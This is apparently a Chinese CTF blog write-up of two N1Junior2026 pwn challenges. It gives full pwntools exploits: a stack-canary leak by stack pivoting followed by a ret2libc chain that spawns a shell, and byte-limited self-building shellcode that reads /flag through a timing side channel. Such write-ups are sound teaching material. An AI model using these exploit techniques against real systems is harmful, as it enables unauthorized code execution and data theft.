---
title: N1Junior2026-pwn WriteUp
date: 2026-01-26 22:37:00
tags: 
    - pwn
    - N1Junior2026
    - WriteUp
    - 栈迁移
    - stack
    - shellcode 技巧
categories: Contest
---
## ez_canary

拿到附件，发现有两个二进制文件： client 和 server ，核心在 server

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/ez_canary/checksec.png)

server 有 canary 保护

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/ez_canary/server_main.png)

当 client 与 server 连接时 server 用 fork 创建子进程

#### pwnhandler

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/ez_canary/server_pwnhandler.png)

pwnhandler 允许修改 rbp 和 ret

#### gift

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/ez_canary/server_gift.png)

gift 有栈溢出

### 攻击思路

server 限制了连接次数为 4 次，之后会重启父进程，因此爆破 canary 行不通

于是考虑利用两次连接

第一次连接：利用栈迁移 leak 出 canary ：先操纵 rbp 到 bss 段上，然后重新调用 pwnhandler 写入 canary 并再一次获得操纵 rbp 和 ret 的机会；于是将 rbp 操纵至原 rbp + 0x19 的位置并劫持返回地址到 pwnhandler 的 write 部分上即可读取 canary

第二次连接：进入 gift 打一遍 ret2libc 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

def conn():
	if debug:
		return process('./client')
	else:
		return remote('60.205.163.215', 18830)

__libc_start_main_offset = 0x23f90
pop_rdi_ret = 0x401893
ret = 0x401894
__libc_start_main_got = 0x403FF0
puts_plt = 0x4011C4
system_offset = 0x52290
bin_sh_str = 0x1b45bd
again_addr = 0x401436
rbp_prov0 = 0x404800
rbp_prov1 = rbp_prov0 + 0x19
pwn_handler_read_addr = 0x40156E
pwn_handler_write_addr = 0x40153A
pwn_handler_canary_addr = 0x40148A

def setreg(io, rbp, rip):
	io.sendlineafter(b'functions?\n', b'2')
	payload = p64(rbp) + p64(rip)
	io.sendafter(b'canary!', payload)

def attack():
	io = conn()
	setreg(io, rbp_prov0, pwn_handler_canary_addr)
	setreg(io, rbp_prov1, pwn_handler_write_addr)
	io.recvuntil(b'[Server]: ')
	canary = u64(io.recv(7).rjust(8, b'\x00'))
	log.info(f'canary = {hex(canary)}')
	io.close()
	io = conn()
	io.sendlineafter(b"functions?\n", b'1')
	payload = b'A' * 56 + p64(canary) + p64(rbp_prov0) + p64(pop_rdi_ret) + p64(__libc_start_main_got) + p64(puts_plt) + p64(again_addr)
	io.sendafter(b"canary!", payload)
	io.recvuntil(b'[Server]: ')
	libc_base = u64(io.recv(6).ljust(8, b'\x00')) - __libc_start_main_offset
	log.info(f'libc_base = {hex(libc_base)}')
	sleep(0.1)
	system_addr = libc_base + system_offset
	bin_sh_addr = libc_base + bin_sh_str
	payload = b'A' * 56 + p64(canary) + p64(rbp_prov0) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
	io.send(payload)
	io.interactive()

attack()
```

## Old_Shellcode

### seccomp

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/old_shellcode/seccomp.png)

禁止了 execve 系统调用，考虑 orw

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/contest/N1Junior-2026/old_shellcode/main.png)

清空除 rdx 外的寄存器后让你写 shellcode

### python

```python
import subprocess

class FlagNotFound(Exception):
    def __str__(self):
        return "FlagNotFound"

class ByteCodeAlreadyUsed(Exception):
    def __str__(self):
        return "ByteCodeAlreadyUsed"
    
class ByteCodeTypesOverLimited(Exception):
    def __str__(self):
        return "ByteCodeTypesOverLimited"

def main():
    blacklist = set()
    flag = bytes()
    with open("/flag", "rb") as f:
        flag = f.readline()
    for i in range(1):
        try:
            user_input = bytes.fromhex(input(f"Enter your shellcode as hex({i}/2):").strip())
            for byte in user_input:
                if byte in blacklist:
                    raise ByteCodeAlreadyUsed

            blacklist = blacklist.union(set(user_input))

            if len(blacklist) >= 16:
                raise ByteCodeTypesOverLimited

            p = subprocess.run(
            ['./chal'],
            capture_output=True,
            input=user_input,
            timeout=2.0,
            )
            if flag not in p.stdout:
                raise FlagNotFound

        except Exception as e:
            print("Error:", e)
            exit()
    print("Well Done.")
    print(p.stdout)
    
main()
```

要求：两次使用的字节码不重复，总计不超过 15 种，且能读出 /flag

### 攻击思路

想不出来怎么构造符合条件的 shellcode ，，，那就侧信道爆破吧

当然还要考虑怎么把使用的字节码压到不超过 15 种，，，

直接写爆破的 shellcode 是困难的，因为各类寄存器操作会使用大量的字节码，，，

因此我们考虑利用少量寄存器操作向 mmap 出的区域手动写入爆破的 shellcode ，使用以下指令：

```
mov rsp, rdx                48 89 d4
add rsp, 0x100              48 81 c4 00 01 00 00
mov rbp, rdx                48 89 d5
add rbp, 0x100              48 81 c5 00 01 00 00
mov ebx, 0                  bb 00 00 00 00
add ebx, 0x100              81 c3 00 01 00 00
mov [rbp], ebx              89 5d 00
nop                         90
```

mmap 上布局如下：

```
|------------------|---------|----------------------|-----------|
读入的 shellcode    nop 填充   爆破的 shellcode        rsp 隔离
```

利用多次执行 add 操作我们可以向 mmap 出的区域写入任意数据，刚好拿来造机器码

写入爆破的 shellcode:

最后几个 nop 用于对齐

```
mov rax, 0x67616c662f       48 b8 2f 66 6c 61 67 00 00 00
push rax                    50
push rsp                    54
pop rdi                     5f
mov eax, 2                  b8 02 00 00 00
syscall                     0f 05

mov rdi, 3                  48 c7 c7 03 00 00 00
push rsp                    54
pop rsi                     5e
mov rdx, 0xff               48 c7 c2 ff 00 00 00
xor rax, rax                48 31 c0
syscall                     0f 05

mov al, [rsp + 0xf]         8a 44 24 0f
cmp al, 0x37                3c 37
LOOP:
je LOOP                     74 fe
nop                         90
nop                         90
nop                         90
```

由于网络不稳定，，，还要多爆破几次，，，不然会发现交上去的 flag 是错的。。。

### exp

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

def conn():
	if debug:
		return remote('127.0.0.1', 1337)
	else:
		return remote('60.205.163.215', 23989)

def mov_rsp_rdx():
	return '4889d4'

def add_rsp_align(align):
	sc = '4881c4'
	for i in range(4):
		if i == align:
			sc += '01'
		else:
			sc += '00'
	return sc

def add_rsp_to(num):
	sc = ''
	sit = 0
	while num > 0:
		lb = num % 0x100
		for i in range(lb):
			sc += add_rsp_align(sit)
		num //= 0x100
		sit += 1
	return sc

def mov_rbp_rdx():
	return '4889d5'

def add_rbp_align(align):
	sc = '4881c5'
	for i in range(4):
		if i == align:
			sc += '01'
		else:
			sc += '00'
	return sc

def add_rbp_to(num):
	sc = ''
	sit = 0
	while num > 0:
		lb = num % 0x100
		for i in range(lb):
			sc += add_rbp_align(sit)
		num //= 0x100
		sit += 1
	return sc

def mov_ebx_0():
	return 'bb00000000'

def add_ebx_align(align):
	sc = '81c3'
	for i in range(4):
		if i == align:
			sc += '01'
		else:
			sc += '00'
	return sc

def add_ebx_to(num):
	sc = ''
	sit = 0
	while num > 0:
		lb = num % 0x100
		for i in range(lb):
			sc += add_ebx_align(sit)
		num //= 0x100
		sit += 1
	return sc

def mov_lrbpl_ebx():
	return '895d00'

def nop():
	return '90'

def initsc(gap):
	sc = ''
	sc += mov_rsp_rdx()
	sc += add_rsp_to(0x7500)
	sc += mov_rbp_rdx()
	sc += add_rbp_to(gap)
	return sc

def writesc(msc):
	msc = msc.replace(' ', '')
	sc = ''
	sc += mov_ebx_0()
	sc += add_ebx_to(u32(bytes.fromhex(msc)))
	sc += mov_lrbpl_ebx()
	sc += add_rbp_to(0x4)
	return sc

def loadorj(idx, char):
	sc = ''
	sc += writesc('48 b8 2f 66')
	sc += writesc('6c 61 67 00')
	sc += writesc('00 00 50 54')
	sc += writesc('5f b8 02 00')
	sc += writesc('00 00 0f 05')
	sc += writesc('48 c7 c7 03')
	sc += writesc('00 00 00 54')
	sc += writesc('5e 48 c7 c2')
	sc += writesc('ff 00 00 00')
	sc += writesc('48 31 c0 0f')
	sc += writesc('05 8a 44 24')
	sc += writesc(f'{idx:02x} 3c {char:02x} 74')
	sc += writesc('fe 90 90 90')
	return sc

def fillnop(num):
	sc = ''
	for i in range(num):
		sc += nop()
	return sc

def scgen(idx, char, gap):
	sc = ''
	sc += initsc(gap) + loadorj(idx, char)
	sc += fillnop(gap - len(sc) // 2)
	return sc

def test(mbyte, char):
	io = conn()
	io.recvuntil(b'hex(0/2):')
	sc = scgen(mbyte, char, 0x7000)
	print(f'Send: {hex(len(sc) // 2)} bytes')
	io.sendline(sc.encode())
	start_time = time.time()
	io.recvall(timeout = 1)
	end_time = time.time()
	io.close()
	return end_time - start_time

def explode():
	flag = 'flag{1t_i5_Ha2d_r1gh'
	idx = len(flag)
	while True:
		for char in range(32, 127):
			try:
				if test(idx, char) > 0.7:
					print(f'Found char at {idx}: {chr(char)} | Current Flag: {flag}')
					flag += chr(char)
					if chr(char) == '}':
						return flag
					break
				else:
					print(f'Test char failed at {idx}: {chr(char)} | Current Flag: {flag}')
			except Exception as e:
				char -= 1
				print(f'Error:{e}')
				continue
		idx += 1
	return flag

def attack():
	print(f"Flag: {explode()}")

attack()
```